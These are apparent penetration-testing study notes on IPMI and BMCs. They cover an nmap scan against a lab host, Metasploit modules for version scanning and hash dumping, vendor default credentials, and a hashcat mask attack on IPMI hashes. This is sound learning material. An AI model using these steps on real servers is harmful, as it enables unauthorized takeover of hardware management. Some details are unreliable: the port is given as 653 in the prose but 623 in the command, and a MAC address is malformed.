## Intelligent Platform Management Interface - Scan + Hashdump

### Core
`(Intelligent Platform Management Interface)` IPMI communicates over **Port 653 UDP**. Systems who utilizes IPMI - Baseboard Management Controllers (`BMCs`) BMCs works on the embedded (hidden) ARM system running Linux, which are directly connected to the motherboard. 

Gaining access to the BMC - *means direct connect to the motherboard* (as a physical) and bring attacker opportunities like: monitoring, rebooting, reinstall software, shutting down, etc. Control is providing via web-based terminal.

### Footprint
1. Nmap:
```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local 

PORT STATE SERVICE 
623/udp open asf-rmcp 
| ipmi-version: 
| Version: | IPMI-2.0 
| UserAuth: 
| PassAuth: auth_user, non_null_user 
|_ Level: 2.0 MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
```

2. Metasploit:
```bash
use auxiliary/scanner/ipmi/ipmi_version
```

### Basic Credentials

| Product           | Username      | Password                                                                  |
| ----------------- | ------------- | ------------------------------------------------------------------------- |
| `DALL iDRAC`      | root          | calvin                                                                    |
| `HP iLO`          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| `Supermicro IPMI` | ADMIN         | ADMIN                                                                     |
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u # password attack
```

### Dumping hashes
```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

https://web.archive.org/web/20260421071724/http://fish2.com/ipmi/remote-pw-cracking.html
